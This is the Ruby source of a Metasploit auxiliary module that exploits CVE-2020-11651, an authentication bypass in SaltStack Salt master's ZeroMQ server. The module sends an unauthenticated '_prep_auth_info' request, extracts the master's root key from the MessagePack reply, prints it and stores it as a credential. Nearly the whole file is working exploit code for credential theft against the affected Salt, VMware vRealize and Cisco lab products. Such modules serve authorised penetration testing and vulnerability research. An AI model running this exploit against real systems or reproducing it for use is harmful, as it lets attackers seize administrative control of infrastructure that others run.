##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::ZeroMQ
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SaltStack Salt Master Server Root Key Disclosure',
        'Description' => %q{
          This module exploits unauthenticated access to the _prep_auth_info()
          method in the SaltStack Salt master's ZeroMQ request server, for
          versions 2019.2.3 and earlier and 3000.1 and earlier, to disclose the
          root key used to authenticate administrative commands to the master.

          VMware vRealize Operations Manager versions 7.5.0 through 8.1.0, as
          well as Cisco Modeling Labs Corporate Edition (CML) and Cisco Virtual
          Internet Routing Lab Personal Edition (VIRL-PE), for versions 1.2,
          1.3, 1.5, and 1.6 in certain configurations, are known to be affected
          by the Salt vulnerabilities.

          Tested against SaltStack Salt 2019.2.3 and 3000.1 on Ubuntu 18.04, as
          well as Vulhub's Docker image.
        },
        'Author' => [
          'F-Secure', # Discovery
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-11651'], # Auth bypass (used by this module)
          ['CVE', '2020-11652'], # Authed directory traversals (not used here)
          ['URL', 'https://labs.f-secure.com/advisories/saltstack-authorization-bypass'],
          ['URL', 'https://community.saltstack.com/blog/critical-vulnerabilities-update-cve-2020-11651-and-cve-2020-11652/'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0009.html'],
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-salt-2vx545AG'],
          ['URL', 'https://github.com/saltstack/salt/blob/master/tests/integration/master/test_clear_funcs.py']
        ],
        'DisclosureDate' => '2020-04-30', # F-Secure advisory
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', { 'Description' => 'Dump root key from Salt master' }]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(4506)
    ])
  end

  def run
    # These are from Msf::Exploit::Remote::ZeroMQ
    zmq_connect
    zmq_negotiate

    unless (root_key = extract_root_key(yeet_prep_auth_info))
      print_error('Could not find root key in serialized auth info')

      # Return CheckCode for exploit/linux/misc/saltstack_salt_unauth_rce
      return Exploit::CheckCode::Safe
    end

    print_good("Root key: #{root_key}")

    # I hate this API, but store the root key in creds, too
    create_credential_and_login(
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'salt/zeromq',
      username: 'root',
      private_data: root_key,
      private_type: :password
    )

    # Return CheckCode for exploit/linux/misc/saltstack_salt_unauth_rce
    Exploit::CheckCode::Vulnerable(root_key) # And the root key as the reason!
  rescue EOFError, Rex::ConnectionError => e
    print_error("#{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  ensure
    # This is from Msf::Exploit::Remote::ZeroMQ
    zmq_disconnect
  end

  def yeet_prep_auth_info
    print_status("Yeeting _prep_auth_info() at #{peer}")

    zmq_send_message(serialize_clear_load('cmd' => '_prep_auth_info'))

    unless (res = sock.get_once)
      fail_with(Failure::Unknown, 'Did not receive auth info')
    end

    unless res.match(/user.+UserAuthenticationError.+root/m)
      fail_with(Failure::UnexpectedReply,
                "Did not receive serialized auth info: #{res.inspect}")
    end

    vprint_good('Received serialized auth info')

    # HACK: Strip assumed ZeroMQ header and leave assumed MessagePack "load"
    res[4..-1]
  end

  def extract_root_key(auth_info)
    # Fetch root key from appropriate index of deserialized data, presumably
    MessagePack.unpack(auth_info)[2]&.fetch('root')
  rescue EOFError, KeyError, MessagePack::MalformedFormatError => e
    print_error("#{__method__} failed: #{e.message}")
    nil
  end

end
